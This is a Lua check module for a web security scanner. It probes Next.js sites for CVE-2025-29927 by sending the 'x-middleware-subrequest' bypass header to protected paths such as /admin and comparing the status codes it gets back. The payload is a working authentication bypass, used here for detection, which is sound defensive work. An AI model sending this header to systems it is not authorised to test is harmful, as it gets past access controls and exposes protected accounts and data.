-- nextjs-middleware-bypass: probes for CVE-2025-29927, the Next.js
-- middleware-subrequest auth bypass.
--
-- Next.js' Pages Router and App Router both run middleware.ts /
-- middleware.js as the first hop on every matched request, and the
-- vast majority of real-world Next.js apps put their authentication,
-- authorization, and tenancy gates there: the route is the only place
-- that runs before getServerSideProps / page handlers / API routes.
--
-- The vulnerability: the internal `x-middleware-subrequest` header
-- (Next.js uses it to short-circuit middleware re-entry when its own
-- runtime issues an internal fetch back into the app) was trusted on
-- the wire. An external attacker setting the header to a chain of
-- "middleware:middleware:..." causes the runtime to count its own
-- depth limit as exceeded and skip middleware entirely, landing the
-- request directly on the protected handler with no auth check ever
-- having run.
--
-- Patched in 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3 (one stream each).
-- Older deployments on any of the four streams are vulnerable.
--
-- Probe shape: take the seed URL plus a small set of conventional
-- protected paths, send each with and without the bypass header, and
-- flag any path whose status drops from a middleware-style block
-- (3xx redirect to /login, 401, 403) to a 200 only when the header is
-- present. The status-class change is the load-bearing signal - body
-- diffing on a dynamic page is too noisy to trust, but a redirect that
-- disappears under a single attacker-controlled header is unambiguous.

local check = {
  name        = "nextjs-middleware-bypass",
  level       = levels.default,
  scope       = scopes.host,
  cwe         = "CWE-285",
  owasp       = "A01:2021 Broken Access Control",
  remediation = "Upgrade Next.js to 12.3.5, 13.5.9, 14.2.25, or 15.2.3+ (whichever release stream you run). As a stopgap before patching, strip the `x-middleware-subrequest` header at your edge / CDN / reverse proxy so attacker-controlled values cannot reach the Next.js runtime.",
  tier        = tiers.active,
  applies_to  = { framework = { framework.nextjs } },
}

-- bypass_header_value is the well-known payload from CVE-2025-29927's
-- public PoC: five "middleware" segments depth-saturate the runtime's
-- subrequest counter on every shipping major. Older streams accept
-- the bare "middleware" value too, but the chained form covers them
-- all.
local BYPASS_HEADER = "x-middleware-subrequest"
local BYPASS_VALUE  = "middleware:middleware:middleware:middleware:middleware"

-- Conventional Next.js paths that operators almost always gate behind
-- middleware. The seed URL is probed first because it's the page the
-- crawler observed; the rest fill in the common case where the seed
-- lands on a public marketing page and the auth surface lives at a
-- canonical sub-path.
local PROTECTED_PATHS = { "/dashboard", "/admin", "/account", "/api/me" }

-- looks_blocked reports whether status looks like a middleware-driven
-- denial: a 3xx redirect (typically to /login or /signin) or an
-- explicit 401/403. A 404 is intentionally excluded - "page does not
-- exist" is not an auth gate, and probing a missing path under the
-- bypass header would not promote it to 200.
local function looks_blocked(status)
  if status >= 300 and status < 400 then return true end
  return status == 401 or status == 403
end

-- probe_pair fetches probe_url twice - once without the bypass header,
-- once with it - and returns the two response status codes plus the
-- bypass-arm body for evidence. Both fetches use follow_redirects=false
-- so the baseline 30x stays as a 30x rather than chasing through to a
-- /login page and reporting 200; the bypass arm uses the same flag for
-- a fair comparison.
local function probe_pair(ctx, probe_url)
  local baseline, _, b_err = ctx.client:fetch{
    method   = methods.get,
    url      = probe_url,
    body_cap = body_caps.small,
  }
  if b_err then return nil, b_err end

  local attack, attack_body, a_err = ctx.client:fetch{
    method   = methods.get,
    url      = probe_url,
    headers  = { [BYPASS_HEADER] = BYPASS_VALUE },
    body_cap = body_caps.probe,
  }
  if a_err then return nil, a_err end

  return {
    baseline_status = baseline:status(),
    attack_status   = attack:status(),
    attack_resp     = attack,
    attack_body     = attack_body,
  }
end

function check.run(ctx)
  local host_root, ok = ctx.host:claim_from_page()
  if not ok then return nil end

  local seen = {}
  local candidates = { ctx.page.url }
  for _, p in ipairs(PROTECTED_PATHS) do
    candidates[#candidates + 1] = host_root .. p
  end

  local first_err
  for _, probe_url in ipairs(candidates) do
    if not seen[probe_url] then
      seen[probe_url] = true
      if ctx.scope:allows(probe_url) then
        local result, err = probe_pair(ctx, probe_url)
        if err then
          if not first_err then first_err = err end
        elseif looks_blocked(result.baseline_status) and result.attack_status == 200 then
          return {
            {
              severity = severity.critical,
              target   = host_root,
              url      = probe_url,
              title    = "Next.js middleware bypass via x-middleware-subrequest (CVE-2025-29927)",
              detail   = string.format(
                "GET %s returned %d without the bypass header but 200 with `%s: %s`. " ..
                "The middleware-subrequest depth-counter trick in CVE-2025-29927 lets an unauthenticated " ..
                "attacker land on routes protected solely by middleware-based auth / authorization gates. " ..
                "Any access control implemented in middleware.ts (session checks, role checks, tenant " ..
                "scoping) is bypassed for as long as the runtime trusts the header.",
                probe_url, result.baseline_status, BYPASS_HEADER, BYPASS_VALUE),
              evidence = ctx.evidence.build{
                method  = methods.get,
                url     = probe_url,
                status  = result.attack_resp:status(),
                headers = result.attack_resp:headers(),
                body    = result.attack_body,
              },
              dedupe_parts = { "cve:2025-29927" },
            },
          }
        end
      end
    end
  end

  if first_err then return nil, first_err end
  return nil
end

return check
